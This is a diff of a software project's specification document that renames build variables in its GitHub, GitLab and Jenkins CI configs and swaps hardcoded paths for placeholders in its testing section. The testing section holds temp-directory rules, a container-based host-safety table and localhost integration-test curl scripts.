           labels: |
             org.opencontainers.image.vendor=apimgr
             org.opencontainers.image.authors=apimgr
-            org.opencontainers.image.title=${{ env.PROJECTNAME }}-aio
-            org.opencontainers.image.description=${{ env.PROJECTNAME }} - all-in-one (debian + postgresql + valkey + tor)
+            org.opencontainers.image.title=${{ env.PROJECT_NAME }}-aio
+            org.opencontainers.image.description=${{ env.PROJECT_NAME }} - all-in-one (debian + postgresql + valkey + tor)
             org.opencontainers.image.version=${{ env.VERSION }}
             org.opencontainers.image.created=${{ env.BUILD_DATE }}
             org.opencontainers.image.revision=${{ env.COMMIT_ID }}
@@ -38260,8 +39903,8 @@ jobs:
           annotations: |
             manifest:org.opencontainers.image.vendor=apimgr
             manifest:org.opencontainers.image.authors=apimgr
-            manifest:org.opencontainers.image.title=${{ env.PROJECTNAME }}-aio
-            manifest:org.opencontainers.image.description=${{ env.PROJECTNAME }} - all-in-one (debian + postgresql + valkey + tor)
+            manifest:org.opencontainers.image.title=${{ env.PROJECT_NAME }}-aio
+            manifest:org.opencontainers.image.description=${{ env.PROJECT_NAME }} - all-in-one (debian + postgresql + valkey + tor)
             manifest:org.opencontainers.image.version=${{ env.VERSION }}
             manifest:org.opencontainers.image.created=${{ env.BUILD_DATE }}
             manifest:org.opencontainers.image.revision=${{ env.COMMIT_ID }}
@@ -38335,8 +39978,8 @@ All `$CI_*` variables are auto-populated by GitLab (works with self-hosted).
 # Equivalent to GitHub Actions: release.yml, beta.yml, daily.yml, docker.yml
 
 variables:
-  PROJECTNAME: "weather"
-  PROJECTORG: "apimgr"
+  PROJECT_NAME: "weather"
+  PROJECT_ORG: "apimgr"
   CGO_ENABLED: "0"
   GOOS: linux
   GOARCH: amd64
@@ -38359,15 +40002,15 @@ stages:
     - export VERSION="${CI_COMMIT_TAG#v}"
     - export COMMIT_ID="${CI_COMMIT_SHORT_SHA}"
     - export BUILD_DATE="$(date +"%a %b %d, %Y at %H:%M:%S %Z")"
-    # OFFICIALSITE (optional): Set in CI/CD Variables, or site.txt file, or leave empty
+    # OFFICIAL_SITE (optional): Set in CI/CD Variables, or site.txt file, or leave empty
     # Never guess or assume - must be explicitly defined by user
     - |
       if [ -f site.txt ]; then
-        export OFFICIALSITE="$(cat site.txt)"
+        export OFFICIAL_SITE="$(cat site.txt)"
       else
-        export OFFICIALSITE="${OFFICIALSITE:-}"
+        export OFFICIAL_SITE="${OFFICIAL_SITE:-}"
       fi
-    - export LDFLAGS="-s -w -X 'main.Version=${VERSION}' -X 'main.CommitID=${COMMIT_ID}' -X 'main.BuildDate=${BUILD_DATE}' -X 'main.OfficialSite=$https://wthr.top'"
+    - export LDFLAGS="-s -w -X 'main.Version=${VERSION}' -X 'main.CommitID=${COMMIT_ID}' -X 'main.BuildDate=${BUILD_DATE}' -X 'main.OfficialSite=${OFFICIAL_SITE}'"
 
 # =============================================================================
 # RELEASE BUILDS (Tag Push: v* or semver)
@@ -38584,7 +40227,7 @@ build:beta:
     - export VERSION="$(date +%Y%m%d%H%M%S)-beta"
     - export COMMIT_ID="${CI_COMMIT_SHORT_SHA}"
     - export BUILD_DATE="$(date +"%a %b %d, %Y at %H:%M:%S %Z")"
-    - export LDFLAGS="-s -w -X 'main.Version=${VERSION}' -X 'main.CommitID=${COMMIT_ID}' -X 'main.BuildDate=${BUILD_DATE}' -X 'main.OfficialSite=$https://wthr.top'"
+    - export LDFLAGS="-s -w -X 'main.Version=${VERSION}' -X 'main.CommitID=${COMMIT_ID}' -X 'main.BuildDate=${BUILD_DATE}' -X 'main.OfficialSite=${OFFICIAL_SITE}'"
   script:
     # Build all 8 platforms
     - GOOS=linux GOARCH=amd64 go build -ldflags "${LDFLAGS}" -o $WEATHER-linux-amd64 ./src
@@ -38632,7 +40275,7 @@ build:daily:
     - export VERSION="$(date +%Y%m%d%H%M%S)"
     - export COMMIT_ID="${CI_COMMIT_SHORT_SHA}"
     - export BUILD_DATE="$(date +"%a %b %d, %Y at %H:%M:%S %Z")"
-    - export LDFLAGS="-s -w -X 'main.Version=${VERSION}' -X 'main.CommitID=${COMMIT_ID}' -X 'main.BuildDate=${BUILD_DATE}' -X 'main.OfficialSite=$https://wthr.top'"
+    - export LDFLAGS="-s -w -X 'main.Version=${VERSION}' -X 'main.CommitID=${COMMIT_ID}' -X 'main.BuildDate=${BUILD_DATE}' -X 'main.OfficialSite=${OFFICIAL_SITE}'"
   script:
     # Build all 8 platforms
     - GOOS=linux GOARCH=amd64 go build -ldflags "${LDFLAGS}" -o $WEATHER-linux-amd64 ./src
@@ -38888,8 +40531,8 @@ pipeline {
     }
 
     environment {
-        PROJECTNAME = 'weather'
-        PROJECTORG = 'apimgr'
+        PROJECT_NAME = 'weather'
+        PROJECT_ORG = 'apimgr'
         BINDIR = 'binaries'
         RELDIR = 'releases'
         GODIR = "/tmp/$APIMGR/go"
@@ -38948,10 +40591,10 @@ pipeline {
                     }
                     env.COMMIT_ID = sh(script: 'git rev-parse --short HEAD', returnStdout: true).trim()
                     env.BUILD_DATE = sh(script: 'date +"%a %b %d, %Y at %H:%M:%S %Z"', returnStdout: true).trim()
-                    // OFFICIALSITE (optional): Set in Jenkins credentials, or site.txt file, or leave empty
+                    // OFFICIAL_SITE (optional): Set in Jenkins credentials, or site.txt file, or leave empty
                     // Never guess or assume - must be explicitly defined by user
-                    env.OFFICIALSITE = sh(script: '[ -f site.txt ] && cat site.txt || echo "${OFFICIALSITE:-}"', returnStdout: true).trim()
-                    env.LDFLAGS = "-s -w -X 'main.Version=${env.VERSION}' -X 'main.CommitID=${env.COMMIT_ID}' -X 'main.BuildDate=${env.BUILD_DATE}' -X 'main.OfficialSite=${env.OFFICIALSITE}'"
+                    env.OFFICIAL_SITE = sh(script: '[ -f site.txt ] && cat site.txt || echo "${OFFICIAL_SITE:-}"', returnStdout: true).trim()
+                    env.LDFLAGS = "-s -w -X 'main.Version=${env.VERSION}' -X 'main.CommitID=${env.COMMIT_ID}' -X 'main.BuildDate=${env.BUILD_DATE}' -X 'main.OfficialSite=${env.OFFICIAL_SITE}'"
                     env.HAS_CLI = sh(script: '[ -d src/client ] && echo true || echo false', returnStdout: true).trim()
                     env.HAS_AGENT = sh(script: '[ -d src/agent ] && echo true || echo false', returnStdout: true).trim()
                 }
@@ -39704,6 +41347,24 @@ Before proceeding, confirm you understand:
 
 # PART 29: TESTING & DEVELOPMENT 
 
+## Host System Safety Applies to All Testing & Debugging
+
+**⚠️ The Host System Safety Rule (PART 0) applies to EVERY action in this PART. There is no testing exemption. ⚠️**
+
+When a test or debug step requires `reboot`, `systemctl`, `iptables`, `mount`, package install, network reconfiguration, or any other host-affecting command, that step MUST run inside a container, VM, chroot, or network namespace — never on the host.
+
+| Test Need | Run It Where |
+|-----------|--------------|
+| Test systemd service install/start/stop | `incus exec test-weather -- systemctl ...` |
+| Test firewall integration | `docker run --rm --cap-add=NET_ADMIN ...` |
+| Test network interface behavior | `ip netns exec {ns} ...` or inside Incus |
+| Test package install / dependency setup | Inside the build container or test container |
+| Test reboot / service restart behavior | `incus restart test-weather` |
+| Test mount / filesystem operations | Inside Incus or VM |
+| Reproduce a kernel-param-dependent bug | Inside VM (QEMU/KVM) |
+
+**See PART 0: "Host System Safety Rule" for the full forbidden-command list, allowed contexts, detection guidance, and the required refusal flow. See FINAL: "HOST SYSTEM SAFETY CHECKLIST" for audit items.**
+
 ## NEVER Use Project Directory for Testing 
 
 **See Critical Rules: Files & Directories Master Rules for complete forbidden lists.**
@@ -39712,8 +41373,8 @@ Before proceeding, confirm you understand:
 
 | REQUIRED | Example |
 |----------|---------|
-| Temp directory | `/tmp/apimgr/weather-XXXXXX/` |
-| Volume mounts | `/tmp/apimgr/weather-XXXXXX/rootfs/` |
+| Temp directory | `/tmp/apimgr/{internal_name}-XXXXXX/` |
+| Volume mounts | `/tmp/apimgr/{internal_name}-XXXXXX/rootfs/` |
 | Test databases | In temp directory, never project |
 
 **The project directory is for SOURCE CODE ONLY. All runtime/test data goes to the OS temp directory.**
@@ -39787,7 +41448,7 @@ Config files are NEVER in the repository. They are generated at RUNTIME:
 | File | Location | Created When |
 |------|----------|--------------|
 | `server.yml` | `{config_dir}/server.yml` (see PART 4) | Server first run |
-| `cli.yml` | `~/.config/apimgr/weather/cli.yml` | CLI first run |
+| `cli.yml` | `~/.config/apimgr/{internal_name}/cli.yml` | CLI first run |
 | Tor config | `{config_dir}/tor/torrc` (see PART 32) | When Tor enabled |
 | Tor data | `{data_dir}/tor/` (see PART 32) | When Tor enabled |
 
@@ -39814,7 +41475,7 @@ Config files are NEVER in the repository. They are generated at RUNTIME:
 
 ## Temporary Directory Structure 
 
-**CRITICAL: NEVER use `/tmp` root directory directly. ALWAYS use `/tmp/apimgr/weather-XXXXXX` structure.**
+**CRITICAL: NEVER use `/tmp` root directory directly. ALWAYS use `/tmp/apimgr/{internal_name}-XXXXXX` structure.**
 
 **FORBIDDEN:**
 - ❌ `/tmp/myfile` - Root tmp directory
@@ -39823,7 +41484,7 @@ Config files are NEVER in the repository. They are generated at RUNTIME:
 - ❌ `/tmp/test-data` - Generic paths
 
 **REQUIRED:**
-- ✓ `/tmp/apimgr/weather-XXXXXX/` - Full structure
+- ✓ `/tmp/apimgr/{internal_name}-XXXXXX/` - Full structure
 - ✓ `/tmp/cloudops/echoip-aB3xY9/` - Org + project + random
 - ✓ `mktemp -d "${TMPDIR:-/tmp}/$APIMGR/$WEATHER-XXXXXX"` - Proper command
 
@@ -39837,7 +41498,7 @@ Config files are NEVER in the repository. They are generated at RUNTIME:
 |----------|--------------------------------|
 | Shell | `mkdir -p "${TMPDIR:-/tmp}/$APIMGR" && mktemp -d "${TMPDIR:-/tmp}/$APIMGR/$WEATHER-XXXXXX"` |
 | Go | `os.MkdirAll(filepath.Join(os.TempDir(), projectOrg), 0755); os.MkdirTemp(filepath.Join(os.TempDir(), projectOrg), projectName+"-")` |
-| Python | `os.makedirs(f"{tempfile.gettempdir()}/{project_org}", exist_ok=True); tempfile.mkdtemp(prefix=f"{project_name}-", dir=f"{tempfile.gettempdir()}/{project_org}")` |
+| Python | `os.makedirs(f"{tempfile.gettempdir()}/apimgr", exist_ok=True); tempfile.mkdtemp(prefix=f"weather-", dir=f"{tempfile.gettempdir()}/apimgr")` |
 
 **Result:** `/tmp/cloudops/echoip-aB3xY9` or `/tmp/netutils/pastebin-k9mN2p` (identifiable by org and project)
 
@@ -39845,9 +41506,9 @@ Config files are NEVER in the repository. They are generated at RUNTIME:
 
 | Purpose | Path Pattern | Example |
 |---------|--------------|---------|
-| Dev/Test runtime | `{tempdir}/apimgr/weather-XXXXXX/` | `/tmp/apimgr/weather-aB3xY9/` |
-| Config volume | `{tempdir}/apimgr/weather-XXXXXX/rootfs/config/` | `/tmp/apimgr/weather-aB3xY9/rootfs/config/` |
-| Data volume | `{tempdir}/apimgr/weather-XXXXXX/rootfs/data/` | `/tmp/apimgr/weather-aB3xY9/rootfs/data/` |
+| Dev/Test runtime | `{temp_dir}/apimgr/{internal_name}-XXXXXX/` | `/tmp/apimgr/{internal_name}-aB3xY9/` |
+| Config volume | `{temp_dir}/apimgr/{internal_name}-XXXXXX/rootfs/config/` | `/tmp/apimgr/{internal_name}-aB3xY9/rootfs/config/` |
+| Data volume | `{temp_dir}/apimgr/{internal_name}-XXXXXX/rootfs/data/` | `/tmp/apimgr/{internal_name}-aB3xY9/rootfs/data/` |
 
 ### OS Temp Directories
 
@@ -39882,7 +41543,7 @@ rm -rf "${TMPDIR:-/tmp}/$APIMGR/"
 
 | WRONG | RIGHT | Why |
 |-------|-------|-----|
-| `/tmp/` | `/tmp/apimgr/weather-XXXXXX/` | NEVER use root tmp |
+| `/tmp/` | `/tmp/apimgr/{internal_name}-XXXXXX/` | NEVER use root tmp |
 | `/tmp/myfile` | `/tmp/cloudops/echoip-aB3xY9/myfile` | Always use org/project structure |
 | `/tmp/echoip` | `/tmp/cloudops/echoip-kL9mN2/` | Missing org, missing random suffix |
 | `/tmp/test-data/` | `/tmp/devtools/quotesvc-Qw5rT1/test-data/` | Generic path not allowed |
@@ -39890,13 +41551,13 @@ rm -rf "${TMPDIR:-/tmp}/$APIMGR/"
 | `os.TempDir()` alone | `os.MkdirTemp(filepath.Join(os.TempDir(), projectOrg), projectName+"-")` | Must nest under org |
 | Hardcoded org name | Detect from git remote or path | Auto-detect, never hardcode |
 
-**Rule: ALL temp directories MUST be under `/tmp/apimgr/weather-XXXXXX/` - no exceptions.**
+**Rule: ALL temp directories MUST be under `/tmp/apimgr/{internal_name}-XXXXXX/` - no exceptions.**
 
 ### Summary: Temp Directory Rules
 
 **The ONLY acceptable temp directory pattern:**
 ```
-/tmp/apimgr/weather-XXXXXX/
+/tmp/apimgr/{internal_name}-XXXXXX/
 ```
 
 **Breaking it down:**
@@ -39980,7 +41641,7 @@ rm -rf "${TMPDIR:-/tmp}/$APIMGR/"
 **Integration tests MUST be comprehensive:**
 - ✓ Test ALL project-specific endpoints (IDEA.md)
 - ✓ If project has CRUD → Test full CRUD (Create, Read, Update, Delete)
-- ✓ Test both API endpoints (`/api/v1/*`) AND frontend routes (`/**`)
+- ✓ Test both API endpoints (`/api/{api_version}/*`) AND frontend routes (`/**`)
 - ✓ Test ALL `.txt` endpoints (robots.txt, security.txt, API .txt extension)
 - ✓ Test content negotiation with ALL required Accept headers (see below)
 - ✓ Test frontend smart detection (browser → HTML, CLI → formatted text)
@@ -40091,34 +41752,34 @@ done
 **Example: User management project MUST test:**
 ```bash
 # API - Current user (authenticated)
-GET    /api/v1/users           # Get current user profile (API JSON)
-PATCH  /api/v1/users           # Update current user profile (API JSON)
+GET    /api/{api_version}/users           # Get current user profile (API JSON)
+PATCH  /api/{api_version}/users           # Update current user profile (API JSON)
 
 # API - Public profiles (by username)
-GET    /api/v1/users/{username}     # Read public profile (API JSON)
-GET    /api/v1/users/{username}.txt # Read public profile (API plain text)
+GET    /api/{api_version}/users/{user_name}     # Read public profile (API JSON)
+GET    /api/{api_version}/users/{user_name}.txt # Read public profile (API plain text)
 
 # API - Admin managing users (by ID)
-GET    /api/v1/admin/users        # List all users (admin)
-GET    /api/v1/admin/users/1      # Read specific user (admin)
-PATCH  /api/v1/admin/users/1      # Update specific user (admin)
-DELETE /api/v1/admin/users/1      # Delete specific user (admin)
+GET    /api/{api_version}/{admin_path}/users        # List all users (admin)
+GET    /api/{api_version}/{admin_path}/users/1      # Read specific user (admin)
+PATCH  /api/{api_version}/{admin_path}/users/1      # Update specific user (admin)
+DELETE /api/{api_version}/{admin_path}/users/1      # Delete specific user (admin)
 
 # Frontend routes (smart detection) - CLI gets beautiful formatted text via HTML2TextConverter
 curl -q -LSsf /users                              # CLI → formatted text (current user)
 browser /users                                    # Browser → HTML page (current user)
-curl -q -LSsf /{username}                         # CLI → formatted text (public profile)
-curl -q -LSsf -H "Accept: text/plain" /{username} # Formatted text (Accept header)
-curl -q -LSsf -H "Accept: text/html" /{username}  # HTML (Accept header)
+curl -q -LSsf /{user_name}                         # CLI → formatted text (public profile)
+curl -q -LSsf -H "Accept: text/plain" /{user_name} # Formatted text (Accept header)
+curl -q -LSsf -H "Accept: text/html" /{user_name}  # HTML (Accept header)
 ```
 
 **Example: Jokes API (read-only) MUST test:**
 ```bash
 # API endpoints
-GET /api/v1/jokes/random             # Random joke (JSON)
-GET /api/v1/jokes/random.txt         # Random joke (text)
-GET /api/v1/jokes/programming        # Category filter (JSON)
-GET /api/v1/jokes/search?q=bug       # Search (JSON)
+GET /api/{api_version}/jokes/random             # Random joke (JSON)
+GET /api/{api_version}/jokes/random.txt         # Random joke (text)
+GET /api/{api_version}/jokes/programming        # Category filter (JSON)
+GET /api/{api_version}/jokes/search?q=bug       # Search (JSON)
 
 # Frontend endpoints (smart detection) - CLI gets formatted text
 curl -q -LSsf /jokes/random                   # CLI → formatted text
@@ -40129,14 +41790,14 @@ curl -q -LSsf -H "Accept: text/html" /jokes   # Browser → HTML
 **Example: Weather API (external integration) MUST test:**
 ```bash
 # API endpoints with location params
-GET /api/v1/weather/current/New%20York        # Current weather (JSON)
-GET /api/v1/weather/current/New%20York.txt    # Current weather (text)
-GET /api/v1/weather/forecast/10001            # ZIP code forecast (JSON)
-GET /api/v1/weather/alerts/40.7128,-74.0060   # Lat/long alerts (JSON)
+GET /api/{api_version}/weather/current/New%20York        # Current weather (JSON)
+GET /api/{api_version}/weather/current/New%20York.txt    # Current weather (text)
+GET /api/{api_version}/weather/forecast/10001            # ZIP code forecast (JSON)
+GET /api/{api_version}/weather/alerts/40.7128,-74.0060   # Lat/long alerts (JSON)
 
 # Test caching behavior
-GET /api/v1/weather/current/Chicago           # First call (cache miss)
-GET /api/v1/weather/current/Chicago           # Second call (cache hit, faster)
+GET /api/{api_version}/weather/current/Chicago           # First call (cache miss)
+GET /api/{api_version}/weather/current/Chicago           # Second call (cache hit, faster)
 
 # Frontend (smart detection) - CLI gets formatted text
 curl -q -LSsf /weather/Chicago                # CLI → formatted text
@@ -40146,10 +41807,10 @@ curl -q -LSsf /weather/forecast/90210         # CLI → formatted text forecast
 **Example: Link Shortener (URL mapping) MUST test:**
 ```bash
 # API CRUD for short links
-POST   /api/v1/links -d '{"url":"https://example.com/long/url"}'  # Create
-GET    /api/v1/links/abc123         # Get link details (JSON)
-PUT    /api/v1/links/abc123 -d '{"url":"https://new.com"}'        # Update
-DELETE /api/v1/links/abc123         # Delete
+POST   /api/{api_version}/links -d '{"url":"https://example.com/long/url"}'  # Create
+GET    /api/{api_version}/links/abc123         # Get link details (JSON)
+PUT    /api/{api_version}/links/abc123 -d '{"url":"https://new.com"}'        # Update
+DELETE /api/{api_version}/links/abc123         # Delete
 
 # Redirect resolution
 GET /abc123                          # Should redirect to destination
@@ -40219,10 +41880,10 @@ make test
 
 | Endpoint Type | Must Test |
 |--------------|-----------|
-| **Public API** | All `/api/v1/*` endpoints |
+| **Public API** | All `/api/{api_version}/*` endpoints |
 | **Public Web** | All frontend routes |
-| **Admin API** | All `/api/v1/admin/*` endpoints |
-| **Admin Web** | All `/admin/*` routes |
+| **Admin API** | All `/api/{api_version}/{admin_path}/*` endpoints |
+| **Admin Web** | All `/{admin_path}/*` routes |
 | **Error cases** | 400, 401, 403, 404, 500 responses |
 | **Edge cases** | Empty data, invalid input, rate limits |
 
@@ -40338,14 +41999,14 @@ test_endpoint() {
 }
 
 # PUBLIC API
-test_endpoint GET "/api/v1/jokes/random"
-test_endpoint GET "/api/v1/jokes/categories"
-test_endpoint GET "/api/v1/jokes/{id}"
+test_endpoint GET "/api/{api_version}/jokes/random"
+test_endpoint GET "/api/{api_version}/jokes/categories"
+test_endpoint GET "/api/{api_version}/jokes/{id}"
 
 # ADMIN API (with auth)
-test_endpoint GET "/api/v1/admin/server/settings"
-test_endpoint PUT "/api/v1/admin/server/settings"
-test_endpoint GET "/api/v1/admin/server/logs"
+test_endpoint GET "/api/{api_version}/{admin_path}/server/settings"
+test_endpoint PUT "/api/{api_version}/{admin_path}/server/settings"
+test_endpoint GET "/api/{api_version}/{admin_path}/server/logs"
 
 # At end: verify ALL endpoints were tested
 verify_all_endpoints_tested
@@ -40493,8 +42154,8 @@ fi
 set -euo pipefail
 
 # Detect project info
-PROJECTNAME=$(basename "$PWD")
-PROJECTORG=$(basename "$(dirname "$PWD")")
+PROJECT_NAME=$(basename "$PWD")
+PROJECT_ORG=$(basename "$(dirname "$PWD")")
 
 # Create temp directory for build
 mkdir -p "${TMPDIR:-/tmp}/$APIMGR"
@@ -40562,10 +42223,10 @@ docker run --rm \
 
     echo '=== API Endpoint Tests ==='
     # Test JSON response (default)
-    curl -q -LSsf http://localhost:64580/api/v1/healthz || echo 'FAILED: /api/v1/healthz'
+    curl -q -LSsf http://localhost:64580/api/{api_version}/healthz || echo 'FAILED: /api/{api_version}/healthz'
 
     # Test .txt extension (plain text)
-    curl -q -LSsf http://localhost:64580/api/v1/healthz.txt || echo 'FAILED: /api/v1/healthz.txt'
+    curl -q -LSsf http://localhost:64580/api/{api_version}/healthz.txt || echo 'FAILED: /api/{api_version}/healthz.txt'
 
     # Test Accept header: application/json
     curl -q -LSsf -H 'Accept: application/json' http://localhost:64580/healthz || echo 'FAILED: Accept JSON'
@@ -40578,9 +42239,9 @@ docker run --rm \
     # Test FULL CRUD if project has CRUD operations
     #
     # Example for jokes API (API routes with .txt extension):
-    #   curl -q -LSsf http://localhost:64580/api/v1/jokes/random || echo 'FAILED: API JSON'
-    #   curl -q -LSsf http://localhost:64580/api/v1/jokes/random.txt || echo 'FAILED: API .txt'
-    #   curl -q -LSsf -H 'Accept: text/plain' http://localhost:64580/api/v1/jokes/random || echo 'FAILED: API Accept text'
+    #   curl -q -LSsf http://localhost:64580/api/{api_version}/jokes/random || echo 'FAILED: API JSON'
+    #   curl -q -LSsf http://localhost:64580/api/{api_version}/jokes/random.txt || echo 'FAILED: API .txt'
+    #   curl -q -LSsf -H 'Accept: text/plain' http://localhost:64580/api/{api_version}/jokes/random || echo 'FAILED: API Accept text'
     #
     # Example for jokes frontend (smart detection, no .txt - test with text for simplicity):
     #   JOKE=\$(curl -q -LSsf http://localhost:64580/jokes/random)  # CLI auto-detects text
@@ -40590,15 +42251,15 @@ docker run --rm \
     #
     # Example for user CRUD (full test suite):
     #   # API - Current user
-    #   curl -q -LSsf http://localhost:64580/api/v1/users || echo 'FAILED: GET current user API'
-    #   curl -q -LSsf -X PATCH -H 'Content-Type: application/json' -d '{\"email\":\"new@test.com\"}' http://localhost:64580/api/v1/users || echo 'FAILED: UPDATE current user API'
+    #   curl -q -LSsf http://localhost:64580/api/{api_version}/users || echo 'FAILED: GET current user API'
+    #   curl -q -LSsf -X PATCH -H 'Content-Type: application/json' -d '{\"email\":\"new@test.com\"}' http://localhost:64580/api/{api_version}/users || echo 'FAILED: UPDATE current user API'
     #   # API - Public profile (by username)
-    #   curl -q -LSsf http://localhost:64580/api/v1/users/testuser || echo 'FAILED: READ public profile API JSON'
-    #   curl -q -LSsf http://localhost:64580/api/v1/users/testuser.txt || echo 'FAILED: READ public profile API .txt'
+    #   curl -q -LSsf http://localhost:64580/api/{api_version}/users/testuser || echo 'FAILED: READ public profile API JSON'
+    #   curl -q -LSsf http://localhost:64580/api/{api_version}/users/testuser.txt || echo 'FAILED: READ public profile API .txt'
     #   # API - Admin routes (by ID)
-    #   curl -q -LSsf http://localhost:64580/api/v1/admin/users || echo 'FAILED: LIST users admin API'
-    #   curl -q -LSsf http://localhost:64580/api/v1/admin/users/1 || echo 'FAILED: READ user admin API'
-    #   curl -q -LSsf -X DELETE http://localhost:64580/api/v1/admin/users/1 || echo 'FAILED: DELETE user admin API'
+    #   curl -q -LSsf http://localhost:64580/api/{api_version}/{admin_path}/users || echo 'FAILED: LIST users admin API'
+    #   curl -q -LSsf http://localhost:64580/api/{api_version}/{admin_path}/users/1 || echo 'FAILED: READ user admin API'
+    #   curl -q -LSsf -X DELETE http://localhost:64580/api/{api_version}/{admin_path}/users/1 || echo 'FAILED: DELETE user admin API'
     #   # Frontend (smart detection - test with text for simplicity)
     #   USERS=\$(curl -q -LSsf http://localhost:64580/users)  # CLI auto-detects text (current user)
     #   USER=\$(curl -q -LSsf http://localhost:64580/testuser)  # CLI auto-detects text (public profile)
@@ -40617,13 +42278,13 @@ docker run --rm \
             -H \"X-Setup-Token: \$SETUP_TOKEN\" \\
             -H \"Content-Type: application/json\" \\
             -d '{\"username\":\"testadmin\",\"password\":\"TestPass123!\"}' \\
-            http://localhost:64580/api/v1/admin/setup || echo 'Admin setup failed (may already exist)'
+            http://localhost:64580/api/{api_version}/{admin_path}/setup || echo 'Admin setup failed (may already exist)'
 
         # Login and get session
         SESSION=\$(curl -q -LSsf -X POST \\
             -H \"Content-Type: application/json\" \\
             -d '{\"username\":\"testadmin\",\"password\":\"TestPass123!\"}' \\
-            http://localhost:64580/api/v1/admin/login | grep -oP '\"session_token\":\\s*\"\\K[^\"]+' || echo '')
+            http://localhost:64580/api/{api_version}/{admin_path}/login | grep -oP '\"session_token\":\\s*\"\\K[^\"]+' || echo '')
 
         if [ -n \"\$SESSION\" ]; then
             echo '✓ Admin login successful'
@@ -40631,7 +42292,7 @@ docker run --rm \
             # Generate API token for CLI/Agent testing
             API_TOKEN=\$(curl -q -LSsf -X POST \\
                 -H \"Authorization: Bearer \$SESSION\" \\
-                http://localhost:64580/api/v1/admin/profile/token | grep -oP '\"token\":\\s*\"\\K[^\"]+' || echo '')
+                http://localhost:64580/api/{api_version}/{admin_path}/profile/token | grep -oP '\"token\":\\s*\"\\K[^\"]+' || echo '')
 
             if [ -n \"\$API_TOKEN\" ]; then
                 echo \"✓ API token created: \${API_TOKEN:0:12}...\"
@@ -40736,8 +42397,8 @@ if ! command -v incus &>/dev/null; then
 fi
 
 # Detect project info
-PROJECTNAME=$(basename "$PWD")
-PROJECTORG=$(basename "$(dirname "$PWD")")
+PROJECT_NAME=$(basename "$PWD")
+PROJECT_ORG=$(basename "$(dirname "$PWD")")
 CONTAINER_NAME="test-$WEATHER-$$"
 
 # Incus image - use latest Debian stable (update when new stable releases)
@@ -40829,10 +42490,10 @@ incus exec "$CONTAINER_NAME" -- bash -c "
 
     echo '=== API Endpoint Tests ==='
     # Test JSON response (default)
-    curl -q -LSsf http://localhost:80/api/v1/healthz || echo 'FAILED: /api/v1/healthz'
+    curl -q -LSsf http://localhost:80/api/{api_version}/healthz || echo 'FAILED: /api/{api_version}/healthz'
 
     # Test .txt extension (plain text)
-    curl -q -LSsf http://localhost:80/api/v1/healthz.txt || echo 'FAILED: /api/v1/healthz.txt'
+    curl -q -LSsf http://localhost:80/api/{api_version}/healthz.txt || echo 'FAILED: /api/{api_version}/healthz.txt'
 
     # Test Accept header: application/json
     curl -q -LSsf -H 'Accept: application/json' http://localhost:80/healthz || echo 'FAILED: Accept JSON'
@@ -40845,9 +42506,9 @@ incus exec "$CONTAINER_NAME" -- bash -c "
     # Test FULL CRUD if project has CRUD operations
     #
     # Example for jokes API (API routes with .txt extension):
-    #   curl -q -LSsf http://localhost:80/api/v1/jokes/random || echo 'FAILED: API JSON'
-    #   curl -q -LSsf http://localhost:80/api/v1/jokes/random.txt || echo 'FAILED: API .txt'
-    #   curl -q -LSsf -H 'Accept: text/plain' http://localhost:80/api/v1/jokes/random || echo 'FAILED: API Accept text'
+    #   curl -q -LSsf http://localhost:80/api/{api_version}/jokes/random || echo 'FAILED: API JSON'
+    #   curl -q -LSsf http://localhost:80/api/{api_version}/jokes/random.txt || echo 'FAILED: API .txt'
+    #   curl -q -LSsf -H 'Accept: text/plain' http://localhost:80/api/{api_version}/jokes/random || echo 'FAILED: API Accept text'
     #
     # Example for jokes frontend (smart detection, no .txt - test with text for simplicity):
     #   JOKE=\$(curl -q -LSsf http://localhost:80/jokes/random)  # CLI auto-detects text
@@ -40857,15 +42518,15 @@ incus exec "$CONTAINER_NAME" -- bash -c "
     #
     # Example for user CRUD (full test suite):
     #   # API - Current user
-    #   curl -q -LSsf http://localhost:80/api/v1/users || echo 'FAILED: GET current user API'
-    #   curl -q -LSsf -X PATCH -H 'Content-Type: application/json' -d '{\"email\":\"new@test.com\"}' http://localhost:80/api/v1/users || echo 'FAILED: UPDATE current user API'
+    #   curl -q -LSsf http://localhost:80/api/{api_version}/users || echo 'FAILED: GET current user API'
+    #   curl -q -LSsf -X PATCH -H 'Content-Type: application/json' -d '{\"email\":\"new@test.com\"}' http://localhost:80/api/{api_version}/users || echo 'FAILED: UPDATE current user API'
     #   # API - Public profile (by username)
-    #   curl -q -LSsf http://localhost:80/api/v1/users/testuser || echo 'FAILED: READ public profile API JSON'
-    #   curl -q -LSsf http://localhost:80/api/v1/users/testuser.txt || echo 'FAILED: READ public profile API .txt'
+    #   curl -q -LSsf http://localhost:80/api/{api_version}/users/testuser || echo 'FAILED: READ public profile API JSON'
+    #   curl -q -LSsf http://localhost:80/api/{api_version}/users/testuser.txt || echo 'FAILED: READ public profile API .txt'
     #   # API - Admin routes (by ID)
-    #   curl -q -LSsf http://localhost:80/api/v1/admin/users || echo 'FAILED: LIST users admin API'
-    #   curl -q -LSsf http://localhost:80/api/v1/admin/users/1 || echo 'FAILED: READ user admin API'
-    #   curl -q -LSsf -X DELETE http://localhost:80/api/v1/admin/users/1 || echo 'FAILED: DELETE user admin API'
+    #   curl -q -LSsf http://localhost:80/api/{api_version}/{admin_path}/users || echo 'FAILED: LIST users admin API'
+    #   curl -q -LSsf http://localhost:80/api/{api_version}/{admin_path}/users/1 || echo 'FAILED: READ user admin API'
+    #   curl -q -LSsf -X DELETE http://localhost:80/api/{api_version}/{admin_path}/users/1 || echo 'FAILED: DELETE user admin API'
     #   # Frontend (smart detection - test with text for simplicity)
     #   USERS=\$(curl -q -LSsf http://localhost:80/users)  # CLI auto-detects text (current user)
     #   USER=\$(curl -q -LSsf http://localhost:80/testuser)  # CLI auto-detects text (public profile)
@@ -40884,13 +42545,13 @@ incus exec "$CONTAINER_NAME" -- bash -c "
             -H \"X-Setup-Token: \$SETUP_TOKEN\" \\
             -H \"Content-Type: application/json\" \\
             -d '{\"username\":\"testadmin\",\"password\":\"TestPass123!\"}' \\
-            http://localhost:80/api/v1/admin/setup || echo 'Admin setup failed (may already exist)'
+            http://localhost:80/api/{api_version}/{admin_path}/setup || echo 'Admin setup failed (may already exist)'
 
         # Login and get session
         SESSION=\$(curl -q -LSsf -X POST \\
             -H \"Content-Type: application/json\" \\
             -d '{\"username\":\"testadmin\",\"password\":\"TestPass123!\"}' \\
-            http://localhost:80/api/v1/admin/login | grep -oP '\"session_token\":\\s*\"\\K[^\"]+' || echo '')
+            http://localhost:80/api/{api_version}/{admin_path}/login | grep -oP '\"session_token\":\\s*\"\\K[^\"]+' || echo '')
 
